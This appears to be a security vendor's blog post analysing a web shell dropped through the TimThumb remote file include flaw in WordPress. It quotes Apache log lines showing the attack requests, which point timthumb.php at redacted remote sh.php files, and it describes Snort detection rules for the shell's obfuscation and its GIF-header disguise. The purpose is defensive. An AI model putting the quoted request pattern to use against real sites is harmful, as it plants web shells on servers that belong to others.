@@ -1,0 +1,27 @@
+
+One of the most actively scanned-for vulnerabilities on the Internet these days is the TimThumb remote file include, an attack released in August of 2011 that targets the popular WordPress module. People scan for it so heavily because doing so is cheap and easy, from a bandwidth and processing perspective: you literally just make a request on a web server for a given file. If you find a vulnerable machine, it then makes a single request to the site of your choosing, and poof, you've got a web shell; if the remote system isn't vulnerable, you just get a 404.
+
+While reviewing some logs recently (I recently started a Twitter feed for ridiculous things I find in my personal web server logs, and the logs of anyone who wants to send me data), I found what appears to be a relatively popular web shell that's being used for these vulnerable TimThumb installations. Hosted primarily on domains disguised to look like they're on the popular Blogger.com, a single one of the VRT's servers had well over two thousand attempts to drop this shell on it since the start of June 2012 alone. 
+
+The attacks are very easy to identify in Apache logs:
+
+[01/Jun/2012:06:05:58 -0400] "GET /iplists/wp-content/themes/freshnews/tools/timthumb.php?src=http://blogger.com.< redacted >.it/sh.php HTTP/1.1" 404 364 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6"
+
+[11/Jun/2012:03:31:23 -0400] "GET //wp-content/plugins/akismet/timthumb.php?src=http://blogger.com.< redacted >.cl/sh.php HTTP/1.1" 404 358 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2"
+
+The actual shell itself that gets dropped is simultaneously sneaky and blatant. The file that comes down actually begins with a valid GIF header - so valid, in fact, that file(1) will return the following:
+
+sh.php: GIF image data, version 89a, 16129 x 16191
+
+From there, though, it launches into some very obviously malicious PHP code, which includes several chunks of heavily obfuscated code:
+
+
+
+
+
+This leads to a pair of useful Snort rules. The first, SID 23113, is based around the obvious obfuscation done with "eval(gzinflate(base64_decode( < blob of data >". No sane web developer would ever go to the trouble of that many layers of obfuscation, but it's an easy way to make life difficult on WAF devices and other security technologies attempting to evaluate your code. 
+
+The second - SID 23114 - is for malformed files. If you see a GIF header, and then an opening PHP tag within the next 100 bytes, well, somebody's up to no good. Yes, technically you might have a PHP tag in a comment within the GIF strucutre - but I'll take the 999 attacks that will likely result out of each 1,000 times this rule fires and not worry too much about the potential for an obscure edge case like that.
+
+As we do with all sorts of live attacks, we'll be watching for updates to this particular shell and adding/updating rules as appropriate. In the meantime, if you've got anything funny you're seeing that you think warrants a VRT rule - send it in, and we'll be happy to analyze it for you.
+
